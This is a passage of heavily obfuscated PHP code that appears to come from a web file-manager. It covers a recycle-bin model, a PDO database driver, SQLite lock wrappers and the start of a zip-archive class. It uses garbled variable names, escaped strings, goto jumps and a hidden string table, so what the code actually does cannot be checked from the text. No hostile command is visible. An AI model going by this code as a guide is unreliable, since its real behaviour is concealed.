$›Â°ËÇ¿ = substr($ñë‚îš, 0, strlen($ñë‚îš) - strlen($Ü¯äª¸)); $ÚÌ¨ëçÀ = $›Â°ËÇ¿ . "\x28{$óÕŠ»¢²}\x29{$Ü¯äª¸}"; if (!in_array_not_case($ÚÌ¨ëçÀ, $‚½¦¨ğ«)) { return $ÚÌ¨ëçÀ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\x72\143\145\137\162\145\143\171\143\154\145"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\124\151\155\145", "\x74\x69\x6d\145", "\151\156\163\145\162\164", "\x66\165\156\x63\x74\x69\157\x6e")); public function listData($Ã¶‡£Èª = false) { $ÈÈƒğì =& $_SERVER[Ü©»’·]; $Ã¶‡£Èª = $Ã¶‡£Èª ? $Ã¶‡£Èª : USER_ID; $È©»¼‰° = $this->where(array($ÈÈƒğì[1660] => $Ã¶‡£Èª))->select(); return array_to_keyvalue($È©»¼‰°, $ÈÈƒğì[12], $ÈÈƒğì[411]); } public function moveToRecycle($·ğĞúßÁ) { $‘»èŞ»¼ =& $_SERVER[Ü©»’·]; $Œñêç£Ş = Model($‘»èŞ»¼[1339]); $Åù“ë ¹ = $Œñêç£Ş->sourceInfo($·ğĞúßÁ); if (!$Åù“ë ¹ || $Åù“ë ¹[$‘»èŞ»¼[440]] == $‘»èŞ»¼[88]) { return; } $¡£Ø–òĞ = array($‘»èŞ»¼[426] => $·ğĞúßÁ, $‘»èŞ»¼[1660] => USER_ID, $‘»èŞ»¼[595] => $Åù“ë ¹[$‘»èŞ»¼[420]], $‘»èŞ»¼[596] => $Åù“ë ¹[$‘»èŞ»¼[514]], $‘»èŞ»¼[599] => $Åù“ë ¹[$‘»èŞ»¼[530]]); $this->add($¡£Ø–òĞ); $this->recycleMove($·ğĞúßÁ, 1); if ($Åù“ë ¹[$‘»èŞ»¼[419]] == $‘»èŞ»¼[88]) { $ÎìŸ÷Ù¦ = array($‘»èŞ»¼[599] => array($‘»èŞ»¼[559], $Åù“ë ¹[$‘»èŞ»¼[530]] . $·ğĞúßÁ . $‘»èŞ»¼[560])); $Œñêç£Ş->where($ÎìŸ÷Ù¦)->setField($‘»èŞ»¼[440], 1); } } public function clear() { $this->remove(!1); } public function remove($¯ƒëÁ¬ = false, $ÌÃ¬­Âò = false) { $§ÍàÍ¼Ä =& $_SERVER[Ü©»’·]; $ÌÃ¬­Âò = $ÌÃ¬­Âò ? $ÌÃ¬­Âò : USER_ID; $¯ı ŸåÔ = Model($§ÍàÍ¼Ä[1339]); $›É¬¾ô = $this->listData($ÌÃ¬­Âò); $¯ƒëÁ¬ = $¯ƒëÁ¬ === !1 ? !1 : $¯ƒëÁ¬; $ò‰ÙøŸÕ = array(); foreach ($›É¬¾ô as $­¾ßÜ‡‘) { if ($¯ƒëÁ¬ != !1 && !in_array($­¾ßÜ‡‘, $¯ƒëÁ¬)) { continue; } $…´Ê®İó = $¯ı ŸåÔ->sourceInfo($­¾ßÜ‡‘); $¯ı ŸåÔ->remove($­¾ßÜ‡‘, !1); $öÕ»¤ = $…´Ê®İó[$§ÍàÍ¼Ä[420]] . $§ÍàÍ¼Ä[11] . $…´Ê®İó[$§ÍàÍ¼Ä[514]]; $ò‰ÙøŸÕ[$öÕ»¤] = array($§ÍàÍ¼Ä[595] => $…´Ê®İó[$§ÍàÍ¼Ä[420]], $§ÍàÍ¼Ä[514] => $…´Ê®İó[$§ÍàÍ¼Ä[514]]); $this->where(array($§ÍàÍ¼Ä[411] => $­¾ßÜ‡‘))->delete(); } foreach ($ò‰ÙøŸÕ as $’‰Ø£ùİ) { $¯ı ŸåÔ->targetSpaceUpdate($’‰Ø£ùİ[$§ÍàÍ¼Ä[420]], $’‰Ø£ùİ[$§ÍàÍ¼Ä[514]]); } } public function restore($²ÒËæ‚Ú = false) { $ùéâ†‰ã = $this->listData(); $this->_restoreSource($ùéâ†‰ã, $²ÒËæ‚Ú); } public function removeUserAll($­ÉÙû§Â) { $this->remove(!1, $­ÉÙû§Â); } private function _restoreSource($ò£éÌŒ, $ê…í¯Õó) { $ìö‡î¹ö =& $_SERVER[Ü©»’·]; $Œ¯·—è = Model($ìö‡î¹ö[1339]); $ê…í¯Õó = $ê…í¯Õó == !1 ? !1 : $ê…í¯Õó; if (!$ò£éÌŒ) { return !0; } $š¬±âí = array(); foreach ($ò£éÌŒ as $ñÕñ»ìš) { if ($ê…í¯Õó != !1 && !in_array($ñÕñ»ìš, $ê…í¯Õó)) { continue; } $ÈØßÅâ§ = $Œ¯·—è->sourceInfo($ñÕñ»ìš); $Ÿì¦œ£ = $Œ¯·—è->sourceInfo($ÈØßÅâ§[$ìö‡î¹ö[441]]); if ($Ÿì¦œ£[$ìö‡î¹ö[440]] == $ìö‡î¹ö[88]) { continue; } $Œ¯·—è->lockMoveStart($ñÕñ»ìš); $this->recycleMove($ñÕñ»ìš, 0); if ($ÈØßÅâ§[$ìö‡î¹ö[419]] == $ìö‡î¹ö[88]) { $˜Í¯ÉİŞ = array($ìö‡î¹ö[599] => array($ìö‡î¹ö[559], $ÈØßÅâ§[$ìö‡î¹ö[530]] . $ñÕñ»ìš . $ìö‡î¹ö[560])); $Œ¯·—è->where($˜Í¯ÉİŞ)->setField($ìö‡î¹ö[440], 0); $this->restoreFolderChildren($ñÕñ»ìš, $ò£éÌŒ); } $this->where(array($ìö‡î¹ö[411] => $ñÕñ»ìš))->delete(); $Œ¯·—è->folderSizeReset($ÈØßÅâ§[$ìö‡î¹ö[441]]); $š¬±âí[] = $ÈØßÅâ§[$ìö‡î¹ö[441]]; if ($ÈØßÅâ§[$ìö‡î¹ö[419]] == $ìö‡î¹ö[88]) { $š¬±âí[] = $ñÕñ»ìš; } $Œ¯·—è->lockMoveEnd($ñÕñ»ìš); } $Œ¯·—è->updateModifyTime($š¬±âí); } private function restoreFolderChildren($ÆæÄóÖû, $³¡Äãú°) { $Ç»òÀòô =& $_SERVER[Ü©»’·]; $çÜ‹Ñİ = Model($Ç»òÀòô[1339]); $ÖªóËôÇ = array($Ç»òÀòô[411] => array($Ç»òÀòô[7], array())); foreach ($³¡Äãú° as $ê™íÛÒ) { if ($ê™íÛÒ == $ÆæÄóÖû) { continue; } if (!$çÜ‹Ñİ->isParentOf($ÆæÄóÖû, $ê™íÛÒ)) { continue; } $ÒÊ­¦ÕÉ = $çÜ‹Ñİ->sourceInfo($ê™íÛÒ); if ($ÒÊ­¦ÕÉ[$Ç»òÀòô[419]] == $Ç»òÀòô[88]) { $ÖªóËôÇ[] = array($Ç»òÀòô[599] => array($Ç»òÀòô[559], $ÒÊ­¦ÕÉ[$Ç»òÀòô[530]] . $ê™íÛÒ . $Ç»òÀòô[560])); } else { $ÖªóËôÇ[$Ç»òÀòô[411]][1][] = $ê™íÛÒ; } } if (!$ÖªóËôÇ[$Ç»òÀòô[411]][1]) { unset($ÖªóËôÇ[$Ç»òÀòô[411]]); } if (!$ÖªóËôÇ) { return; } $ÖªóËôÇ[$Ç»òÀòô[411]][1] = array_unique($ÖªóËôÇ[$Ç»òÀòô[411]][1]); $ÖªóËôÇ[$Ç»òÀòô[1003]] = $Ç»òÀòô[1956]; $çÜ‹Ñİ->where($ÖªóËôÇ)->setField($Ç»òÀòô[440], 1); } private function recycleMove($øïú¾Äœ, $ÉÂéğÀÌ = 1) { $ËšÇÖ—Ñ =& $_SERVER[Ü©»’·]; $½Õ½¼ ã = Model($ËšÇÖ—Ñ[1339]); $Âê÷Êş® = Model($ËšÇÖ—Ñ[2167]); $Î²µ˜ş = array($ËšÇÖ—Ñ[411] => $øïú¾Äœ); if ($ÉÂéğÀÌ) { $½Õ½¼ ã->where($Î²µ˜ş)->setField($ËšÇÖ—Ñ[440], 1); $Âê÷Êş®->eventRecycle($øïú¾Äœ, $ËšÇÖ—Ñ[2168]); } else { $ÍÉ†’ìÖ = $½Õ½¼ ã->where($Î²µ˜ş)->find(); $ĞÖë¢¢ = $ÍÉ†’ìÖ[$ËšÇÖ—Ñ[419]] == $ËšÇÖ—Ñ[88]; $¤İÈ…ëç = $½Õ½¼ ã->fileNameAuto($ÍÉ†’ìÖ[$ËšÇÖ—Ñ[441]], $ÍÉ†’ìÖ[$ËšÇÖ—Ñ[32]], REPEAT_RENAME_FOLDER, $ĞÖë¢¢); if ($¤İÈ…ëç != $ÍÉ†’ìÖ[$ËšÇÖ—Ñ[32]]) { $½Õ½¼ ã->rename($øïú¾Äœ, $¤İÈ…ëç); } $½Õ½¼ ã->where($Î²µ˜ş)->setField($ËšÇÖ—Ñ[440], 0); $Âê÷Êş®->eventRecycle($øïú¾Äœ, $ËšÇÖ—Ñ[2169]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\x73\157\165\x72\143\x65\x53\145\x63\162\145\164\114\151\163\x74"; public $field = array("\x73\157\165\162\143\x65\111\104", "\x74\171\x70\x65\111\x44", "\x63\x72\145\x61\x74\145\x55\x73\145\x72"); } goto B½ä¼šé†Ë; Aœ Äİš™: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÅïÂÁ•­ = '') { $ÏïØ‡ó” =& $_SERVER[Ü©»’·]; if (!class_exists($ÏïØ‡ó”[917])) { think_exception(think_lang($ÏïØ‡ó”[14]) . $ÏïØ‡ó”[918]); } if (!empty($ÅïÂÁ•­)) { $this->config = $ÅïÂÁ•­; if (empty($this->config[$ÏïØ‡ó”[17]])) { $this->config[$ÏïØ‡ó”[17]] = array(); } } } public function connect($©ù‹ŒöÃ = '', $œíÖø´ = 0) { $äĞº¿ÕÎ =& $_SERVER[Ü©»’·]; if (!isset($this->linkID[$œíÖø´])) { if (empty($©ù‹ŒöÃ)) { $©ù‹ŒöÃ = $this->config; } $ÖçëêÆ½ = !empty($©ù‹ŒöÃ[$äĞº¿ÕÎ[17]][$äĞº¿ÕÎ[18]]) ? $©ù‹ŒöÃ[$äĞº¿ÕÎ[17]][$äĞº¿ÕÎ[18]] : $this->pconnect; if ($ÖçëêÆ½) { $©ù‹ŒöÃ[$äĞº¿ÕÎ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$œíÖø´] = new PDO($©ù‹ŒöÃ[$äĞº¿ÕÎ[919]], $©ù‹ŒöÃ[$äĞº¿ÕÎ[891]], $©ù‹ŒöÃ[$äĞº¿ÕÎ[892]], $©ù‹ŒöÃ[$äĞº¿ÕÎ[17]]); } catch (PDOException $Ç°¹Íà‘) { think_exception($Ç°¹Íà‘->getMessage()); } $this->dbType = $this->_getDsnType($©ù‹ŒöÃ[$äĞº¿ÕÎ[919]]); if (in_array($this->dbType, array($äĞº¿ÕÎ[920], $äĞº¿ÕÎ[921], $äĞº¿ÕÎ[922], $äĞº¿ÕÎ[923]))) { think_exception($äĞº¿ÕÎ[924] . $this->dbType . $äĞº¿ÕÎ[925] . $this->dbType . $äĞº¿ÕÎ[926]); } if (!$this->linkID[$œíÖø´]) { think_exception($äĞº¿ÕÎ[927]); } try { $this->linkID[$œíÖø´]->exec($äĞº¿ÕÎ[928] . think_config($äĞº¿ÕÎ[894])); } catch (Exception $Ç°¹Íà‘) { } $this->connected = !0; if (1 != think_config($äĞº¿ÕÎ[22])) { unset($this->config); } } return $this->linkID[$œíÖø´]; } public function free() { $this->PDOStatement = null; } public function query($†à‡úÍ›, $«ı«‹­î = array()) { $º¼å³Ç¨ =& $_SERVER[Ü©»’·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $†à‡úÍ›; if (!empty($«ı«‹­î)) { $this->queryStr .= $º¼å³Ç¨[929] . print_r($«ı«‹­î, !0) . $º¼å³Ç¨[930]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($º¼å³Ç¨[23], 1); think_status($º¼å³Ç¨[24]); $this->PDOStatement = $this->_linkID->prepare($†à‡úÍ›); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¯û»¸Â‘ = $this->PDOStatement->execute($«ı«‹­î); $this->debug(); if (!1 === $¯û»¸Â‘) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ç…ìÒÀ, $ƒ×ÔÌü† = array()) { $½úÙâÏ =& $_SERVER[Ü©»’·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ç…ìÒÀ; if (!empty($ƒ×ÔÌü†)) { $this->queryStr .= $½úÙâÏ[929] . print_r($ƒ×ÔÌü†, !0) . $½úÙâÏ[930]; } $íğƒ¨Œ² = !1; if ($this->dbType == $½úÙâÏ[923]) { if (preg_match($½úÙâÏ[931], $this->queryStr, $ßöş¨½)) { $this->table = think_config($½úÙâÏ[932]) . str_ireplace(think_config($½úÙâÏ[933]), $½úÙâÏ[387], $ßöş¨½[2]); $íğƒ¨Œ² = (bool) $this->query($½úÙâÏ[934] . strtoupper($this->table) . $½úÙâÏ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($½úÙâÏ[25], 1); think_status($½úÙâÏ[24]); $this->PDOStatement = $this->_linkID->prepare($Ç…ìÒÀ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‘»úÂœâ = $this->PDOStatement->execute($ƒ×ÔÌü†); $this->debug(); if (!1 === $‘»úÂœâ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($íğƒ¨Œ² || preg_match($½úÙâÏ[935], $Ç…ìÒÀ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ûê ·­ô = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ûê ·­ô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ü™Å„ç = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ü™Å„ç) { $this->error(); return !1; } } return !0; } private function getAll() { $ÅÔšßœÉ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ÅÔšßœÉ); return $ÅÔšßœÉ; } public function getFields($ˆ“ÊÉ¹) { $é¿Ï•ı¿ =& $_SERVER[Ü©»’·]; $this->initConnect(!0); if (think_config($é¿Ï•ı¿[936])) { $÷úğ¿µÄ = str_replace($é¿Ï•ı¿[937], $ˆ“ÊÉ¹, think_config($é¿Ï•ı¿[936])); } else { switch ($this->dbType) { case $é¿Ï•ı¿[920]: case $é¿Ï•ı¿[938]: $÷úğ¿µÄ = "\x53\105\x4c\105\x43\124\40\40\x20\x63\157\154\165\x6d\156\137\156\x61\155\x65\x20\x61\163\40\47\x4e\x61\155\x65\47\x2c\x20\40\40\x64\x61\164\141\137\164\x79\160\x65\40\x61\x73\40\47\x54\171\160\145\47\x2c\x20\x20\40\x63\157\x6c\x75\155\156\x5f\144\145\x66\141\165\x6c\x74\40\x61\163\x20\47\x44\x65\x66\x61\165\154\x74\47\54\40\40\x20\151\163\x5f\156\165\154\x6c\x61\142\x6c\x65\x20\141\x73\40\x27\116\x75\x6c\154\x27\xa\x9\x9\106\x52\x4f\115\x9\x69\x6e\146\157\x72\x6d\141\164\x69\157\x6e\137\163\x63\150\x65\155\141\x2e\x74\x61\142\154\x65\x73\x20\101\123\40\164\xa\x9\11\112\x4f\x49\116\11\151\x6e\x66\x6f\x72\x6d\141\164\x69\x6f\x6e\x5f\163\143\150\145\x6d\141\56\x63\x6f\154\165\x6d\x6e\163\40\x41\123\x20\143\12\11\11\117\x4e\x20\40\164\56\164\141\142\x6c\145\x5f\x63\x61\164\x61\154\x6f\x67\x20\75\40\x63\56\x74\x61\142\154\x65\x5f\x63\141\164\x61\x6c\x6f\147\xa\x9\x9\x41\116\104\40\x74\x2e\x74\141\142\x6c\145\137\x73\143\150\145\155\141\40\x3d\40\x63\x2e\164\x61\x62\154\145\x5f\x73\x63\150\x65\155\141\12\x9\11\x41\116\104\x20\164\x2e\x74\x61\142\154\145\x5f\x6e\x61\x6d\x65\x20\75\40\143\56\164\141\x62\x6c\145\137\x6e\141\x6d\x65\xa\x9\x9\127\x48\105\122\x45\40\40\40\164\x2e\164\x61\142\154\145\137\156\x61\155\x65\40\x3d\x20\47{$ˆ“ÊÉ¹}\x27"; break; case $é¿Ï•ı¿[939]: $÷úğ¿µÄ = $é¿Ï•ı¿[940] . $ˆ“ÊÉ¹ . $é¿Ï•ı¿[941]; break; case $é¿Ï•ı¿[921]: case $é¿Ï•ı¿[923]: $÷úğ¿µÄ = $é¿Ï•ı¿[942] . $é¿Ï•ı¿[943] . $é¿Ï•ı¿[944] . strtoupper($ˆ“ÊÉ¹) . $é¿Ï•ı¿[945] . strtoupper($ˆ“ÊÉ¹) . $é¿Ï•ı¿[946]; break; case $é¿Ï•ı¿[947]: $÷úğ¿µÄ = $é¿Ï•ı¿[948] . $ˆ“ÊÉ¹ . $é¿Ï•ı¿[949]; break; case $é¿Ï•ı¿[922]: break; case $é¿Ï•ı¿[950]: default: $÷úğ¿µÄ = $é¿Ï•ı¿[951] . ($this->dbType == $é¿Ï•ı¿[950] ? "\x60{$ˆ“ÊÉ¹}\140" : $ˆ“ÊÉ¹); } } $¸Ï•Ùìˆ = $this->query($÷úğ¿µÄ); $ÄÉ€¿Ÿ© = array(); if ($¸Ï•Ùìˆ) { foreach ($¸Ï•Ùìˆ as $Õ”ô¼ºû => $¡ÑÉ‰×—) { $¡ÑÉ‰×— = array_change_key_case($¡ÑÉ‰×—); $¡ÑÉ‰×—[$é¿Ï•ı¿[32]] = isset($¡ÑÉ‰×—[$é¿Ï•ı¿[32]]) ? $¡ÑÉ‰×—[$é¿Ï•ı¿[32]] : $é¿Ï•ı¿[387]; $¡ÑÉ‰×—[$é¿Ï•ı¿[33]] = isset($¡ÑÉ‰×—[$é¿Ï•ı¿[33]]) ? $¡ÑÉ‰×—[$é¿Ï•ı¿[33]] : $é¿Ï•ı¿[387]; $¥ØÜÜÜ¤ = isset($¡ÑÉ‰×—[$é¿Ï•ı¿[273]]) ? $¡ÑÉ‰×—[$é¿Ï•ı¿[273]] : $¡ÑÉ‰×—[$é¿Ï•ı¿[32]]; $ÄÉ€¿Ÿ©[$¥ØÜÜÜ¤] = array($é¿Ï•ı¿[32] => $¥ØÜÜÜ¤, $é¿Ï•ı¿[33] => $¡ÑÉ‰×—[$é¿Ï•ı¿[33]], $é¿Ï•ı¿[35] => (bool) (isset($¡ÑÉ‰×—[$é¿Ï•ı¿[103]]) && $¡ÑÉ‰×—[$é¿Ï•ı¿[103]] === $é¿Ï•ı¿[12] || isset($¡ÑÉ‰×—[$é¿Ï•ı¿[35]]) && $¡ÑÉ‰×—[$é¿Ï•ı¿[35]] === $é¿Ï•ı¿[12]), $é¿Ï•ı¿[37] => isset($¡ÑÉ‰×—[$é¿Ï•ı¿[37]]) ? $¡ÑÉ‰×—[$é¿Ï•ı¿[37]] : (isset($¡ÑÉ‰×—[$é¿Ï•ı¿[56]]) ? $¡ÑÉ‰×—[$é¿Ï•ı¿[56]] : $é¿Ï•ı¿[387]), $é¿Ï•ı¿[39] => isset($¡ÑÉ‰×—[$é¿Ï•ı¿[94]]) ? strtolower($¡ÑÉ‰×—[$é¿Ï•ı¿[94]]) == $é¿Ï•ı¿[41] : (isset($¡ÑÉ‰×—[$é¿Ï•ı¿[57]]) ? $¡ÑÉ‰×—[$é¿Ï•ı¿[57]] : !1), $é¿Ï•ı¿[42] => isset($¡ÑÉ‰×—[$é¿Ï•ı¿[952]]) ? strtolower($¡ÑÉ‰×—[$é¿Ï•ı¿[952]]) == $é¿Ï•ı¿[44] : (isset($¡ÑÉ‰×—[$é¿Ï•ı¿[94]]) ? $¡ÑÉ‰×—[$é¿Ï•ı¿[94]] : !1)); } } return $ÄÉ€¿Ÿ©; } public function getTables($ÔÙÕ¦ÊÔ = '') { $«Ôî‹ë¥ =& $_SERVER[Ü©»’·]; if (think_config($«Ôî‹ë¥[953])) { $ş–º™¸ = str_replace($«Ôî‹ë¥[954], $ÔÙÕ¦ÊÔ, think_config($«Ôî‹ë¥[953])); } else { switch ($this->dbType) { case $«Ôî‹ë¥[921]: case $«Ôî‹ë¥[923]: $ş–º™¸ = $«Ôî‹ë¥[955]; break; case $«Ôî‹ë¥[920]: case $«Ôî‹ë¥[938]: $ş–º™¸ = $«Ôî‹ë¥[956]; break; case $«Ôî‹ë¥[947]: $ş–º™¸ = $«Ôî‹ë¥[957]; break; case $«Ôî‹ë¥[922]: think_exception(think_lang($«Ôî‹ë¥[958]) . $«Ôî‹ë¥[959]); break; case $«Ôî‹ë¥[939]: $ş–º™¸ = $«Ôî‹ë¥[45] . $«Ôî‹ë¥[46] . $«Ôî‹ë¥[47]; break; case $«Ôî‹ë¥[950]: default: if (!empty($ÔÙÕ¦ÊÔ)) { $ş–º™¸ = $«Ôî‹ë¥[902] . $ÔÙÕ¦ÊÔ . $«Ôî‹ë¥[903]; } else { $ş–º™¸ = $«Ôî‹ë¥[904]; } } } $øÔ•ºú§ = $this->query($ş–º™¸); $¯”‹ÑŸâ = array(); foreach ($øÔ•ºú§ as $ºœÓ±çÍ => $À¨’ÉÄ›) { $¯”‹ÑŸâ[$ºœÓ±çÍ] = current($À¨’ÉÄ›); } return $¯”‹ÑŸâ; } protected function parseLimit($¦Ğ¿¶©ù) { $Ó´ôï›Í =& $_SERVER[Ü©»’·]; $şÕİß = $Ó´ôï›Í[12]; if (!empty($¦Ğ¿¶©ù)) { switch ($this->dbType) { case $Ó´ôï›Í[947]: case $Ó´ôï›Í[939]: $¦Ğ¿¶©ù = explode($Ó´ôï›Í[50], $¦Ğ¿¶©ù); if (count($¦Ğ¿¶©ù) > 1) { $şÕİß .= $Ó´ôï›Í[51] . $¦Ğ¿¶©ù[1] . $Ó´ôï›Í[52] . $¦Ğ¿¶©ù[0] . $Ó´ôï›Í[53]; } else { $şÕİß .= $Ó´ôï›Í[51] . $¦Ğ¿¶©ù[0] . $Ó´ôï›Í[53]; } break; case $Ó´ôï›Í[920]: case $Ó´ôï›Í[938]: break; case $Ó´ôï›Í[922]: break; case $Ó´ôï›Í[921]: case $Ó´ôï›Í[923]: break; case $Ó´ôï›Í[950]: default: $şÕİß .= $Ó´ôï›Í[51] . $¦Ğ¿¶©ù . $Ó´ôï›Í[53]; } } return $şÕİß; } public function parseKey(&$úêÀ™Œ¼, $«í™’Ü = true) { $ä¹¿Æƒ• =& $_SERVER[Ü©»’·]; if ($«í™’Ü) { $úêÀ™Œ¼ = $this->parseKeyCheck($úêÀ™Œ¼); } if ($this->dbType == $ä¹¿Æƒ•[950]) { if ($úêÀ™Œ¼ != $ä¹¿Æƒ•[188] && !preg_match($ä¹¿Æƒ•[914], $úêÀ™Œ¼)) { $úêÀ™Œ¼ = $ä¹¿Æƒ•[394] . trim($úêÀ™Œ¼, $ä¹¿Æƒ•[394]) . $ä¹¿Æƒ•[394]; } return $úêÀ™Œ¼; } else { return parent::parseKey($úêÀ™Œ¼, $«í™’Ü); } } public function close() { $this->_linkID = null; } public function error() { $§Ù“ô– =& $_SERVER[Ü©»’·]; if ($this->PDOStatement) { $âÊØ›Æ = $this->PDOStatement->errorInfo(); $this->error = $âÊØ›Æ[1] . $§Ù“ô–[4] . $âÊØ›Æ[2]; } else { $this->error = $§Ù“ô–[12]; } if ($§Ù“ô–[12] != $this->queryStr) { $this->error .= LNG($§Ù“ô–[48]) . $this->queryStr; } think_trace($this->error, $§Ù“ô–[12], $§Ù“ô–[49]); return $this->error; } public function escapeString($äİ»ğÀ) { $ë¡ò¿–ò =& $_SERVER[Ü©»’·]; switch ($this->dbType) { case $ë¡ò¿–ò[947]: case $ë¡ò¿–ò[920]: case $ë¡ò¿–ò[938]: case $ë¡ò¿–ò[950]: return addslashes($äİ»ğÀ); case $ë¡ò¿–ò[922]: case $ë¡ò¿–ò[939]: case $ë¡ò¿–ò[921]: case $ë¡ò¿–ò[923]: return str_ireplace($ë¡ò¿–ò[58], $ë¡ò¿–ò[59], $äİ»ğÀ); } } protected function parseValue($•Ë÷¡•Ó) { $Ú—‹¶ö =& $_SERVER[Ü©»’·]; if (is_string($•Ë÷¡•Ó)) { $©¿ È¥• = strpos($•Ë÷¡•Ó, $Ú—‹¶ö[4]) === 0 && in_array($•Ë÷¡•Ó, array_keys($this->bind)); $•Ë÷¡•Ó = $©¿ È¥• ? $this->escapeString($•Ë÷¡•Ó) : $Ú—‹¶ö[960] . $this->escapeString($•Ë÷¡•Ó) . $Ú—‹¶ö[960]; } elseif (isset($•Ë÷¡•Ó[0]) && is_string($•Ë÷¡•Ó[0]) && strtolower($•Ë÷¡•Ó[0]) == $Ú—‹¶ö[297]) { $•Ë÷¡•Ó = $this->escapeString($•Ë÷¡•Ó[1]); } elseif (is_array($•Ë÷¡•Ó)) { $•Ë÷¡•Ó = array_map(array($this, $Ú—‹¶ö[961]), $•Ë÷¡•Ó); } elseif (is_bool($•Ë÷¡•Ó)) { $•Ë÷¡•Ó = $•Ë÷¡•Ó ? $Ú—‹¶ö[88] : $Ú—‹¶ö[197]; } elseif (is_null($•Ë÷¡•Ó)) { $•Ë÷¡•Ó = $Ú—‹¶ö[103]; } return $•Ë÷¡•Ó; } public function getLastInsertId() { $Šşë¬ÇÅ =& $_SERVER[Ü©»’·]; switch ($this->dbType) { case $Šşë¬ÇÅ[947]: case $Šşë¬ÇÅ[939]: case $Šşë¬ÇÅ[920]: case $Šşë¬ÇÅ[938]: case $Šşë¬ÇÅ[922]: case $Šşë¬ÇÅ[950]: return $this->_linkID->lastInsertId(); case $Šşë¬ÇÅ[921]: case $Šşë¬ÇÅ[923]: $²µ”Ä = $this->table; $«ú—¥ŸŒ = $this->query("\x53\x45\x4c\105\x43\124\40{$²µ”Ä}\x2e\x63\165\x72\162\x76\x61\x6c\40\x63\x75\x72\x72\166\x61\154\40\x46\x52\117\115\x20\x64\x75\x61\154"); return $«ú—¥ŸŒ ? $«ú—¥ŸŒ[0][$Šşë¬ÇÅ[962]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($»ÀÂ¾Çí) { $¹æ·²ØÃ =& $_SERVER[Ü©»’·]; if (!CacheLock::fileLock($¹æ·²ØÃ[13])) { return !1; } $‰³©ãàº = parent::query($»ÀÂ¾Çí); CacheLock::fileUnLock($¹æ·²ØÃ[13]); return $‰³©ãàº; } public function execute($Ç ¢…–·) { $Ï¢ÒÌˆÏ =& $_SERVER[Ü©»’·]; if (!CacheLock::fileLock($Ï¢ÒÌˆÏ[13])) { return !1; } $ç¯Öå¸è = parent::execute($Ç ¢…–·); CacheLock::fileUnLock($Ï¢ÒÌˆÏ[13]); return $ç¯Öå¸è; } } class DbSqlite3 extends DbSqlite3Base { public function query($¾¹·±º™) { $—«ÃØŠ¢ =& $_SERVER[Ü©»’·]; if (!CacheLock::fileLock($—«ÃØŠ¢[13])) { return !1; } $åÁ•âï£ = parent::query($¾¹·±º™); CacheLock::fileUnLock($—«ÃØŠ¢[13]); return $åÁ•âï£; } public function execute($’ ®Ù²) { $ÏÖçÑÇº =& $_SERVER[Ü©»’·]; if (!CacheLock::fileLock($ÏÖçÑÇº[13])) { return !1; } $ÛÊ•¢Ì = parent::execute($’ ®Ù²); CacheLock::fileUnLock($ÏÖçÑÇº[13]); return $ÛÊ•¢Ì; } } goto c‚Ã­ê‡Ûğ; C³·‚ë„è¦: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¼ ±©¼Ë; if ($¼ ±©¼Ë) { return $¼ ±©¼Ë; } $ı—™ó° = IO::init($_SERVER[Ü©»’·][8]); return $ı—™ó°; } private static function iconvSystem($Ô½î´ç³) { return self::local()->iconvSystem($Ô½î´ç³); } private static function iconvApp($éù¹ŠÁ¹) { return self::local()->iconvApp($éù¹ŠÁ¹); } public static function zipFolder($Á‚œĞ€¤, $ÔûşÒğ¡ = "\172\151\x70", $§µ¦ßò = '', $ª©ŒÍË = REPEAT_RENAME) { $¥Å˜¼‰Å =& $_SERVER[Ü©»’·]; $Æ³†¨ëï = IO::listPath($Á‚œĞ€¤); if (!$Æ³†¨ëï) { return !1; } $Æ³†¨ëï = array_merge($Æ³†¨ëï[$¥Å˜¼‰Å[82]], $Æ³†¨ëï[$¥Å˜¼‰Å[83]]); return self::zip($Æ³†¨ëï, $ÔûşÒğ¡, $§µ¦ßò, $ª©ŒÍË); } public static function zip($åİƒîÃí, $º³ˆù‹¯ = "\x7a\151\160", $å¸Ğâ¿¦ = '', $¥ÂÖ¼Ôı = REPEAT_RENAME) { $¿†ˆ´¼‚ =& $_SERVER[Ü©»’·]; if (is_string($åİƒîÃí) && $åİƒîÃí) { $åİƒîÃí = array(array($¿†ˆ´¼‚[84] => $åİƒîÃí)); } $Ì‚òÙíß = self::init($åİƒîÃí[0][$¿†ˆ´¼‚[84]]); $áËÕÄ‡É = self::info($åİƒîÃí[0][$¿†ˆ´¼‚[84]]); $Éİæ®ø¯ = $¿†ˆ´¼‚[12]; $€ÈÒäŠÑ = $¿†ˆ´¼‚[12]; $ƒüÎ´éŸ = $¿†ˆ´¼‚[12]; if ($å¸Ğâ¿¦) { $€ÈÒäŠÑ = get_path_father($å¸Ğâ¿¦); $ƒüÎ´éŸ = get_path_this($å¸Ğâ¿¦); } else { $€ÈÒäŠÑ = self::pathFather($áËÕÄ‡É[$¿†ˆ´¼‚[84]]); $ƒüÎ´éŸ = $áËÕÄ‡É[$¿†ˆ´¼‚[32]] . $¿†ˆ´¼‚[10] . $º³ˆù‹¯; if (count($åİƒîÃí) > 1) { $ìéè¥õ­ = IO::info($€ÈÒäŠÑ); $ƒüÎ´éŸ = 